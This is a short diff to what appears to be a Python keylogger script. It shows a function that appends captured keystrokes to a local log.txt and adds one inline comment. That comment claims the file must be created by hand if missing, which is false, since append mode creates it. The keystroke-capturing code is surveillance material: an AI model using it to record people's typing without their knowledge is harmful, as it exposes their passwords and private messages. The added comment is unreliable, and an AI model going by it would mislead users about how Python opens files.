@@ -30,7 +30,7 @@ def onRelease(key):
 # Opens a text file called "log.txt" in append mode, removes all quotation marks,
 # and then writes logged keys to the file (adding newlines instead of spaces and removing miscellaneous keys like backspaces)
 def writeFile(keys):
-    with open("log.txt", "a") as file:
+    with open("log.txt", "a") as file:  # If this file doesn't already exist, you'll need to make one yourself
         for key in keys:
             k = str(key).replace("'", "")
             if(k.find("space") > 0):
